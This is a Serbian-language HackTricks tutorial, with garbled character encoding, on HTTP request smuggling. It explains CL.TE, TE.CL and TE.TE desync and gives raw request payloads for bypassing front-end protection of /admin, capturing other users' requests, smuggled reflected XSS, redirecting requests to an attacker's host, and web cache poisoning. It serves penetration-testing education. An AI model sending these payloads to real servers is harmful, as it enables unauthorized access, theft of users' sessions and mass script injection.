# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Å ta je

Ova ranjivost se javlja kada **desinhronizacija** izmeÄ‘u **front-end proxy-ja** i **back-end** servera omoguÄ‡ava **napadaÄu** da **poÅ¡alje** HTTP **zahtev** koji Ä‡e biti **tumaÄen** kao **jedan zahtev** od strane **front-end** proxy-ja (balansiranje optereÄ‡enja/reverse-proxy) i **kao 2 zahteva** od strane **back-end** servera.\
Ovo omoguÄ‡ava korisniku da **modifikuje sledeÄ‡i zahtev koji stiÅ¾e do back-end servera nakon njega**.

### Teorija

[**RFC Specifikacija (2161)**](https://tools.ietf.org/html/rfc2616)

> Ako se poruka primi sa i Transfer-Encoding zaglavljem i Content-Length zaglavljem, ovaj drugi MORA biti ignorisan.

**Content-Length**

> Entitet zaglavlje Content-Length pokazuje veliÄinu entitet-tela, u bajtovima, poslatom primaocu.

**Transfer-Encoding: chunked**

> Transfer-Encoding zaglavlje specificira oblik enkodiranja koji se koristi za bezbedan prenos tela optereÄ‡enja korisniku.\
> Chunked znaÄi da se veliki podaci Å¡alju u seriji delova.

### Realnost

**Front-End** (balansiranje optereÄ‡enja / Reverse Proxy) **obraÄ‘uje** _**content-length**_ ili _**transfer-encoding**_ zaglavlje, a **Back-end** server **obraÄ‘uje drugo** Å¡to izaziva **desinhronizaciju** izmeÄ‘u ova 2 sistema.\
Ovo moÅ¾e biti veoma kritiÄno jer **napadaÄ moÅ¾e poslati jedan zahtev** reverse proxy-ju koji Ä‡e biti **tumaÄen** od strane **back-end** servera **kao 2 razliÄita zahteva**. **Opasnost** ove tehnike leÅ¾i u tome Å¡to Ä‡e **back-end** server **tumaÄiti** **ubaceni drugi zahtev** kao da je **doÅ¡ao od sledeÄ‡eg klijenta** i **pravi zahtev** tog klijenta Ä‡e biti **deo** **ubacenog zahteva**.

### Posebnosti

Zapamtite da u HTTP **novi karakter nove linije Äine 2 bajta:**

* **Content-Length**: Ovo zaglavlje koristi **decimalni broj** da pokaÅ¾e **broj** **bajtova** tela zahteva. Telo se oÄekuje da se zavrÅ¡i poslednjim karakterom, **nova linija nije potrebna na kraju zahteva**.
* **Transfer-Encoding:** Ovo zaglavlje koristi u **telu** **heksadecimalni broj** da pokaÅ¾e **broj** **bajtova** **sledeÄ‡eg chunk-a**. **Chunk** mora **zavrÅ¡iti** sa **novom linijom** ali ova nova linija **nije uraÄunata** u indikator duÅ¾ine. Ovaj metod prenosa mora zavrÅ¡iti sa **chunk-om veliÄine 0 praÄ‡enim sa 2 nove linije**: `0`
* **Connection**: Na osnovu mog iskustva preporuÄuje se koristiti **`Connection: keep-alive`** na prvom zahtevu za Request Smuggling.

## Osnovni Primeri

{% hint style="success" %}
Kada pokuÅ¡avate da iskoristite ovo sa Burp Suite **onemoguÄ‡ite `Update Content-Length` i `Normalize HTTP/1 line endings`** u repeater-u jer neki ureÄ‘aji zloupotrebljavaju nove linije, povratne znakove i neispravne duÅ¾ine sadrÅ¾aja.
{% endhint %}

Napadi HTTP zahtevom za desinhronizaciju se kreiraju slanjem nejasnih zahteva koji iskoriÅ¡Ä‡avaju razlike u tome kako front-end i back-end serveri tumaÄe `Content-Length` (CL) i `Transfer-Encoding` (TE) zaglavlja. Ovi napadi mogu se manifestovati u razliÄitim oblicima, preteÅ¾no kao **CL.TE**, **TE.CL** i **TE.TE**. Svaki tip predstavlja jedinstvenu kombinaciju prioriteta koje front-end i back-end serveri daju ovim zaglavlja. Ranjivosti nastaju kada serveri obraÄ‘uju isti zahtev na razliÄite naÄine, dovodeÄ‡i do neoÄekivanih i potencijalno zlonamernih ishoda.

### Osnovni Primeri Tipova Ranjivosti

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Ranjivost (Content-Length koriÅ¡Ä‡en od strane Front-End, Transfer-Encoding koriÅ¡Ä‡en od strane Back-End)

* **Front-End (CL):** Obradjuje zahtev na osnovu `Content-Length` zaglavlja.
* **Back-End (TE):** Obradjuje zahtev na osnovu `Transfer-Encoding` zaglavlja.
* **Scenario Napada:**
* NapadaÄ Å¡alje zahtev gde vrednost `Content-Length` zaglavlja ne odgovara stvarnoj duÅ¾ini sadrÅ¾aja.
* Front-end server prosleÄ‘uje ceo zahtev back-end serveru, na osnovu vrednosti `Content-Length`.
* Back-end server obraÄ‘uje zahtev kao chunked zbog `Transfer-Encoding: chunked` zaglavlja, tumaÄeÄ‡i preostale podatke kao odvojen, naknadni zahtev.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Ranjivost (Transfer-Encoding koriÅ¡Ä‡en od strane Front-End, Content-Length koriÅ¡Ä‡en od strane Back-End)

* **Front-End (TE):** Obradjuje zahtev na osnovu `Transfer-Encoding` zaglavlja.
* **Back-End (CL):** Obradjuje zahtev na osnovu `Content-Length` zaglavlja.
* **Scenario Napada:**
* NapadaÄ Å¡alje chunked zahtev gde se veliÄina chunk-a (`7b`) i stvarna duÅ¾ina sadrÅ¾aja (`Content-Length: 4`) ne poklapaju.
* Front-end server, poÅ¡tujuÄ‡i `Transfer-Encoding`, prosleÄ‘uje ceo zahtev back-end serveru.
* Back-end server, poÅ¡tujuÄ‡i `Content-Length`, obraÄ‘uje samo poÄetni deo zahteva (`7b` bajtova), ostavljajuÄ‡i ostatak kao deo nenamernog naknadnog zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Vulnerability (Transfer-Encoding koriÅ¡Ä‡en od strane oba, sa obfuscacijom)

* **Serveri:** Oba podrÅ¾avaju `Transfer-Encoding`, ali jedan moÅ¾e biti prevaren da ga ignoriÅ¡e putem obfuscacije.
* **Scenario napada:**
* NapadaÄ Å¡alje zahtev sa obfuskovanim `Transfer-Encoding` zaglavljima.
* Zavisno o tome koji server (prednji ili zadnji) ne uspe da prepozna obfuskaciju, moÅ¾e se iskoristiti CL.TE ili TE.CL ranjivost.
* NeobraÄ‘eni deo zahteva, viÄ‘en od strane jednog od servera, postaje deo narednog zahteva, Å¡to dovodi do krijumÄarenja.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length koriÅ¡Ä‡en od strane oba prednji i zadnji deo):**

* Oba servera obraÄ‘uju zahtev iskljuÄivo na osnovu zaglavlja `Content-Length`.
* Ovaj scenario obiÄno ne dovodi do krijumÄarenja, jer postoji usklaÄ‘enost u tome kako oba servera tumaÄe duÅ¾inu zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalan zahtev
```

#### **CL != 0 Scenario:**

* Odnosi se na scenarije gde je zaglavlje `Content-Length` prisutno i ima vrednost razliÄitu od nule, Å¡to ukazuje da telo zahteva ima sadrÅ¾aj.
* KljuÄno je za razumevanje i kreiranje napada krijumÄarenja, jer utiÄe na to kako serveri odreÄ‘uju kraj zahteva.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Telo sa sadrÅ¾ajem
```

#### Razbijanje veb servera

Ova tehnika je takoÄ‘e korisna u scenarijima gde je moguÄ‡e **pokvariti veb server dok se Äita poÄetni HTTP podaci** ali **bez zatvaranja konekcije**. Na ovaj naÄin, **telo** HTTP zahteva Ä‡e biti smatrano **narednim HTTP zahtevom**.

Na primer, kako je objaÅ¡njeno u [**ovom objaÅ¡njenju**](https://mizu.re/post/twisty-python), u Werkzeug-u je bilo moguÄ‡e poslati neke **Unicode** karaktere i to Ä‡e naterati server da se **pokvari**. MeÄ‘utim, ako je HTTP konekcija uspostavljena sa zaglavljem **`Connection: keep-alive`**, telo zahteva neÄ‡e biti proÄitano i konekcija Ä‡e i dalje biti otvorena, tako da Ä‡e se **telo** zahteva smatrati **narednim HTTP zahtevom**.

#### Forsiranje putem hop-by-hop zaglavlja

Zloupotrebom hop-by-hop zaglavlja moÅ¾ete ukazati proksiju da **obriÅ¡e zaglavlje Content-Length ili Transfer-Encoding tako da je moguÄ‡e zloupotrebiti HTTP zahtev krijumÄarenjem**.
```
Connection: Content-Length
```
Za **viÅ¡e informacija o zaglavlja korak-po-korak** posetite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## PronalaÅ¾enje Ranjivosti HTTP zahteva za krijumÄarenje

Identifikacija ranjivosti HTTP zahteva za krijumÄarenje Äesto se moÅ¾e postiÄ‡i koriÅ¡Ä‡enjem tehnika vremena, koje se oslanjaju na posmatranje koliko dugo serveru treba da odgovori na manipulisane zahteve. Ove tehnike su posebno korisne za otkrivanje CL.TE i TE.CL ranjivosti. Pored ovih metoda, postoje i druge strategije i alati koji se mogu koristiti za pronalaÅ¾enje takvih ranjivosti:

### PronalaÅ¾enje CL.TE Ranjivosti KoriÅ¡Ä‡enjem Tehnika Vremena

* **Metod:**
* PoÅ¡aljite zahtev koji Ä‡e, ako je aplikacija ranjiva, naterati serversku stranu da Äeka na dodatne podatke.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Posmatranje:**
* Prednja serverska strana obraÄ‘uje zahtev na osnovu `Content-Length` i prekida poruku prerano.
* Zadnja serverska strana, oÄekujuÄ‡i poruku u blokovima, Äeka sledeÄ‡i blok koji nikada ne stiÅ¾e, uzrokujuÄ‡i kaÅ¡njenje.
* **Indikatori:**
* Istek vremena ili dugotrajna kaÅ¡njenja u odgovoru.
* Primanje greÅ¡ke 400 Bad Request od zadnje serverske strane, ponekad sa detaljnim informacijama o serveru.

### PronalaÅ¾enje TE.CL Ranjivosti KoriÅ¡Ä‡enjem Tehnika Vremena

* **Metod:**
* PoÅ¡aljite zahtev koji Ä‡e, ako je aplikacija ranjiva, naterati serversku stranu da Äeka na dodatne podatke.
*   **Primer:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Posmatranje:**
* Prednja serverska strana obraÄ‘uje zahtev na osnovu `Transfer-Encoding` i prosleÄ‘uje celu poruku.
* Zadnja serverska strana, oÄekujuÄ‡i poruku na osnovu `Content-Length`, Äeka na dodatne podatke koji nikada ne stiÅ¾u, uzrokujuÄ‡i kaÅ¡njenje.

### Druge Metode za PronalaÅ¾enje Ranjivosti

* **Analiza diferencijalnog odgovora:**
* PoÅ¡aljite blago varijante zahteva i posmatrajte da li se odgovori servera razlikuju na neoÄekivan naÄin, Å¡to ukazuje na neslaganje u parsiranju.
* **KoriÅ¡Ä‡enje Automatizovanih Alata:**
* Alati poput Burp Suite-ovog dodatka 'HTTP Request Smuggler' mogu automatski testirati ove ranjivosti slanjem razliÄitih oblika nejasnih zahteva i analiziranjem odgovora.
* **Testovi varijacije Content-Length:**
* PoÅ¡aljite zahteve sa razliÄitim vrednostima `Content-Length` koje nisu usklaÄ‘ene sa stvarnom duÅ¾inom sadrÅ¾aja i posmatrajte kako server obraÄ‘uje takve neslaganja.
* **Testovi varijacije Transfer-Encoding:**
* PoÅ¡aljite zahteve sa zamuÄ‡enim ili neispravnim zaglavljima `Transfer-Encoding` i pratite kako prednja i zadnja serverska strana reaguju na takve manipulacije.

### Testiranje Ranjivosti HTTP zahteva za krijumÄarenje

Nakon potvrde efikasnosti tehnika vremena, kljuÄno je verifikovati da li se klijentski zahtevi mogu manipulisati. Jednostavan metod je pokuÅ¡ati otrovati vaÅ¡e zahteve, na primer, tako Å¡to Ä‡e zahtev za `/` rezultirati odgovorom 404. Primeri `CL.TE` i `TE.CL` koji su prethodno razmatrani u [Osnovnim Primerima](./#basic-examples) pokazuju kako otrovati klijentov zahtev da izazove odgovor 404, iako klijent pokuÅ¡ava pristupiti drugom resursu.

**KljuÄne Razmatranja**

Prilikom testiranja ranjivosti zahteva za krijumÄarenje meÅ¡anjem sa drugim zahtevima, imajte na umu:

* **RazliÄite MreÅ¾ne Veze:** "Napadni" i "normalni" zahtevi trebaju biti poslati preko odvojenih mreÅ¾nih veza. KoriÅ¡Ä‡enje iste veze za oba ne potvrÄ‘uje prisustvo ranjivosti.
* **Konstantne URL adrese i Parametri:** Ciljajte da koristite identiÄne URL adrese i imena parametara za oba zahteva. Moderne aplikacije Äesto rutiraju zahteve ka specifiÄnim zadnjim serverskim stranama na osnovu URL adresa i parametara. Podudaranje ovih poveÄ‡ava verovatnoÄ‡u da Ä‡e oba zahteva biti obraÄ‘ena od strane istog servera, Å¡to je preduslov za uspeÅ¡an napad.
* **Vremenski i TrkaÄki Uslovi:** "Normalni" zahtev, namenjen otkrivanju meÅ¡anja sa "napadnim" zahtevom, takmiÄi se sa drugim istovremenim zahtevima aplikacije. Stoga, poÅ¡aljite "normalni" zahtev odmah nakon "napadnog" zahteva. Zauzete aplikacije mogu zahtevati viÅ¡e pokuÅ¡aja za potvrdu ranjivosti.
* **Izazovi Balansiranja OptereÄ‡enja:** Prednje serverske strane koje deluju kao balanseri optereÄ‡enja mogu distribuirati zahteve ka razliÄitim zadnjim sistemima. Ako "napadni" i "normalni" zahtevi zavrÅ¡e na razliÄitim sistemima, napad neÄ‡e uspeti. Ovaj aspekt balansiranja optereÄ‡enja moÅ¾e zahtevati viÅ¡e pokuÅ¡aja za potvrdu ranjivosti.
* **NeÅ¾eljeni Uticaj na Korisnike:** Ako vaÅ¡ napad nenamerno utiÄe na zahtev drugog korisnika (ne "normalni" zahtev koji ste poslali radi detekcije), to ukazuje da je vaÅ¡ napad uticao na drugog korisnika aplikacije. Kontinuirano testiranje moÅ¾e poremetiti druge korisnike, zahtevajuÄ‡i oprezan pristup.

## Zloupotreba HTTP zahteva za krijumÄarenje

### ObilaÅ¾enje Bezbednosti Prednje Strane putem HTTP zahteva za krijumÄarenje

Ponekad, prednji proksi sprovodi bezbednosne mere, analizirajuÄ‡i dolazne zahteve. MeÄ‘utim, ove mere mogu biti zaobiÄ‘ene iskoriÅ¡Ä‡avanjem HTTP zahteva za krijumÄarenje, omoguÄ‡avajuÄ‡i neovlaÅ¡Ä‡en pristup ograniÄenim krajnjim taÄkama. Na primer, pristup `/admin` moÅ¾e biti zabranjen spolja, pri Äemu prednji proksi aktivno blokira takve pokuÅ¡aje. Ipak, ovaj proksi moÅ¾e propustiti da inspicira ugneÅ¾Ä‘ene zahteve unutar krijumÄarenog HTTP zahteva, ostavljajuÄ‡i rupu za zaobilaÅ¾enje ovih ograniÄenja.

Razmotrite sledeÄ‡e primere koji ilustruju kako se HTTP zahtevi za krijumÄarenje mogu koristiti za obilaÅ¾enje kontrola bezbednosti prednje strane, ciljajuÄ‡i specifiÄno putanju `/admin` koja je obiÄno Äuvana od strane prednjeg proksija:

**Primer CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
U napadu CL.TE, zaglavlje `Content-Length` se koristi za poÄetni zahtev, dok ugneÅ¾deni zahtev koristi zaglavlje `Transfer-Encoding: chunked`. Prednji proxy obraÄ‘uje poÄetni `POST` zahtev ali ne pregleda ugneÅ¾deni `GET /admin` zahtev, omoguÄ‡avajuÄ‡i neovlaÅ¡Ä‡en pristup putanji `/admin`.

**TE.CL Primer**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Suprotno tome, u TE.CL napadu, poÄetni `POST` zahtev koristi `Transfer-Encoding: chunked`, a naknadni ugnjeÅ¾deni zahtev se obraÄ‘uje na osnovu zaglavlja `Content-Length`. SliÄno kao kod CL.TE napada, prednji proxy propuÅ¡ta ugnjeÅ¾deni `GET /admin` zahtev, nenamerno omoguÄ‡avajuÄ‡i pristup ograniÄenom `/admin` putanji.

### Otkrivanje prepravljanja zahteva na prednjoj strani <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacije Äesto koriste **prednji server** da modifikuju dolazne zahteve pre prosleÄ‘ivanja na serversku stranu. TipiÄna modifikacija ukljuÄuje dodavanje zaglavlja, kao Å¡to je `X-Forwarded-For: <IP klijenta>`, kako bi se prosledila IP adresa klijenta serverskoj strani. Razumevanje ovih modifikacija moÅ¾e biti kljuÄno, jer moÅ¾e otkriti naÄine za **zaobilaÅ¾enje zaÅ¡tite** ili **otkrivanje skrivenih informacija ili krajnjih taÄaka**.

Da biste istraÅ¾ili kako proxy menja zahtev, pronaÄ‘ite POST parametar koji serverska strana vraÄ‡a u odgovoru. Zatim, kreirajte zahtev, koristeÄ‡i ovaj parametar na kraju, sliÄno kao u sledeÄ‡em primeru:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
U ovoj strukturi, naknadni delovi zahteva se dodaju nakon `search=`, koji je parametar prikazan u odgovoru. Ovaj odraz Ä‡e otkriti zaglavlja naknadnog zahteva.

VaÅ¾no je uskladiti `Content-Length` zaglavlje ugnjeÅ¾denog zahteva sa stvarnom duÅ¾inom sadrÅ¾aja. PoÄevÅ¡i od male vrednosti i postepeno je poveÄ‡avajuÄ‡i je preporuÄljivo, jer preniska vrednost moÅ¾e skratiti odraÅ¾ene podatke, dok previsoka vrednost moÅ¾e izazvati greÅ¡ku u zahtevu.

Ova tehnika je takoÄ‘e primenjiva u kontekstu ranjivosti TE.CL, ali zahtev treba da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti Ä‡e se dodati parametru pretrage.

Ovaj metod preteÅ¾no sluÅ¾i da se razumeju modifikacije zahteva koje je napravio prednji proxy, suÅ¡tinski vrÅ¡eÄ‡i samostalnu istragu.

### Snimanje zahteva drugih korisnika <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

MoguÄ‡e je snimiti zahteve sledeÄ‡eg korisnika dodavanjem odreÄ‘enog zahteva kao vrednosti parametra tokom POST operacije. Evo kako se to moÅ¾e postiÄ‡i:

Dodavanjem sledeÄ‡eg zahteva kao vrednosti parametra, moÅ¾ete saÄuvati zahtev sledeÄ‡eg klijenta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
U ovom scenariju, **parametar komentara** je namenjen za Äuvanje sadrÅ¾aja unutar sekcije komentara na javno dostupnoj stranici. Kao rezultat, sadrÅ¾aj narednog zahteva Ä‡e se pojaviti kao komentar.

MeÄ‘utim, ova tehnika ima svoja ograniÄenja. Generalno, hvata podatke samo do granice parametra koriÅ¡Ä‡ene u prokrijumÄarenom zahtevu. Za URL-kodirane forme, ova granica je znak `&`. To znaÄi da Ä‡e uhvaÄ‡eni sadrÅ¾aj iz zahteva Å¾rtve stati na prvom `&`, Å¡to moÅ¾e biti deo upita.

Dodatno, vaÅ¾no je napomenuti da je ovaj pristup takoÄ‘e izvodljiv sa ranjivoÅ¡Ä‡u TE.CL. U takvim sluÄajevima, zahtev bi trebalo da se zavrÅ¡i sa `search=\r\n0`. Bez obzira na znakove nove linije, vrednosti Ä‡e biti dodate parametru pretrage.

### KoriÅ¡Ä‡enje HTTP zahteva za prokrijumÄarenje radi iskoriÅ¡Ä‡avanja reflektovanog XSS

HTTP zahtev za prokrijumÄarenje moÅ¾e se iskoristiti za iskoriÅ¡Ä‡avanje veb stranica koje su ranjive na **Reflektovani XSS**, nudeÄ‡i znaÄajne prednosti:

* Interakcija sa ciljanim korisnicima **nije potrebna**.
* OmoguÄ‡ava iskoriÅ¡Ä‡avanje XSS u delovima zahteva koji su **normalno nedostupni**, poput zaglavlja HTTP zahteva.

U scenarijima gde je veb sajt podloÅ¾an Reflektovanom XSS putem zaglavlja User-Agent, sledeÄ‡i payload demonstrira kako iskoristiti ovu ranjivost:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ova payload je strukturirana da iskoristi ranjivost na sledeÄ‡i naÄin:

1. Pokretanje `POST` zahteva, navodno tipiÄnog, sa zaglavljem `Transfer-Encoding: chunked` kako bi oznaÄili poÄetak smugglinga.
2. Nastavak sa `0`, oznaÄavajuÄ‡i kraj chunked tela poruke.
3. Zatim se uvodi smuggled `GET` zahtev, gde je zaglavlje `User-Agent` ubaÄeno sa skriptom, `<script>alert(1)</script>`, pokreÄ‡uÄ‡i XSS kada server obradi ovaj naknadni zahtev.

Manipulacijom `User-Agent`-a putem smugglinga, payload zaobilazi normalna ograniÄenja zahteva, iskoriÅ¡Ä‡avajuÄ‡i tako ranjivost Reflected XSS na nekonvencionalan, ali efikasan naÄin.

#### HTTP/0.9

{% hint style="danger" %}
U sluÄaju da korisniÄki sadrÅ¾aj bude reflektovan u odgovoru sa **`Content-type`** kao Å¡to je **`text/plain`**, spreÄavajuÄ‡i izvrÅ¡enje XSS-a. Ako server podrÅ¾ava **HTTP/0.9, moÅ¾da je moguÄ‡e zaobiÄ‡i ovo**!
{% endhint %}

Verzija HTTP/0.9 je prethodila verziji 1.0 i koristi samo **GET** glagole i **ne** odgovara sa **zaglavljima**, veÄ‡ samo telom.

U [**ovom writeup-u**](https://mizu.re/post/twisty-python), ovo je zloupotrebljeno sa zahtevom za smuggling i **ranjivim endpointom koji Ä‡e odgovoriti sa unosom korisnika** kako bi se prokrijumÄario zahtev sa HTTP/0.9. Parametar koji Ä‡e biti reflektovan u odgovoru sadrÅ¾ava **laÅ¾ni HTTP/1.1 odgovor (sa zaglavljima i telom)** tako da Ä‡e odgovor sadrÅ¾ati validan izvrÅ¡ni JS kod sa `Content-Type`-om `text/html`.

### IskoriÅ¡Ä‡avanje On-site Preusmerenja sa HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacije Äesto preusmeravaju sa jednog URL-a na drugi koristeÄ‡i ime hosta iz `Host` zaglavlja u URL-u preusmerenja. Ovo je uobiÄajeno kod web servera poput Apache i IIS. Na primer, zahtevanje fascikle bez kosa crta na kraju rezultuje preusmeravanjem da ukljuÄi kosu crtu:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Rezultati su:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Iako naizgled bezopasno, ovaj ponaÅ¡anje moÅ¾e biti manipulisan koriÅ¡Ä‡enjem HTTP zahteva za krijumÄarenje kako bi se korisnici preusmerili na spoljni sajt. Na primer:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ova prokrijumÄarena zahtev moÅ¾e uzrokovati da sledeÄ‡i obraÄ‘eni korisniÄki zahtev bude preusmeren na veb lokaciju kojom upravlja napadaÄ:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Rezultati su:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
U ovom scenariju, zahtev korisnika za JavaScript datotekom je otet. NapadaÄ moÅ¾e potencijalno ugroziti korisnika posluÅ¾ivanjem zlonamernog JavaScript koda kao odgovor.

### IskoriÅ¡Ä‡avanje Trovanja Web KeÅ¡a putem HTTP Zahteva Smuggling-a <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Trovanje web keÅ¡a moÅ¾e biti izvrÅ¡eno ako bilo koji deo **front-end infrastrukture keÅ¡ira sadrÅ¾aj**, obiÄno radi poboljÅ¡anja performansi. Manipulacijom odgovora servera, moguÄ‡e je **trovanje keÅ¡a**.

Ranije smo primetili kako se odgovori servera mogu promeniti da bi vratili greÅ¡ku 404 (pogledajte [Osnovne Primere](./#basic-examples)). SliÄno tome, moguÄ‡e je prevariti server da isporuÄi sadrÅ¾aj `/index.html` kao odgovor na zahtev za `/static/include.js`. Kao rezultat, sadrÅ¾aj `/static/include.js` se zamenjuje u keÅ¡u sa sadrÅ¾ajem `/index.html`, ÄineÄ‡i `/static/include.js` nedostupnim korisnicima, Å¡to potencijalno moÅ¾e dovesti do DoS (Denial of Service) napada.

Ova tehnika postaje posebno moÄ‡na ako se otkrije **Ranjivost otvorenog preusmeravanja** ili ako postoji **preusmeravanje na otvoreno preusmeravanje na sajtu**. Takve ranjivosti mogu biti iskoriÅ¡Ä‡ene da bi se zamenio keÅ¡ sadrÅ¾aj `/static/include.js` skriptom pod kontrolom napadaÄa, omoguÄ‡avajuÄ‡i suÅ¡tinski Å¡irok napad Cross-Site Scripting (XSS) protiv svih klijenata koji zahtevaju aÅ¾urirani `/static/include.js`.

U nastavku je prikazano iskoriÅ¡Ä‡avanje **trovanja keÅ¡a u kombinaciji sa preusmeravanjem na otvoreno preusmeravanje na sajtu**. Cilj je promeniti keÅ¡ sadrÅ¾aj `/static/include.js` da posluÅ¾i JavaScript kod koji kontroliÅ¡e napadaÄ:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Primetite ugneÅ¾Ä‘eni zahtev usmeren ka `/post/next?postId=3`. Ovaj zahtev Ä‡e biti preusmeren na `/post?postId=4`, koristeÄ‡i **vrednost zaglavlja Host** da odredi domen. Menjanjem **zaglavlja Host**, napadaÄ moÅ¾e preusmeriti zahtev na svoj domen (**unutraÅ¡nja preusmerenja na otvorena preusmerenja**).

Nakon uspeÅ¡nog **trovanja soketa**, treba pokrenuti **GET zahtev** za `/static/include.js`. Ovaj zahtev Ä‡e biti kontaminiran prethodnim zahtevom **unutraÅ¡nja preusmerenja na otvorena preusmerenja** i dohvatiti sadrÅ¾aj skripte kojom upravlja napadaÄ.

Nakon toga, svaki zahtev za `/static/include.js` Ä‡e posluÅ¾iti keÅ¡irani sadrÅ¾aj skripte napadaÄa, efikasno pokreÄ‡uÄ‡i Å¡irok XSS napad.

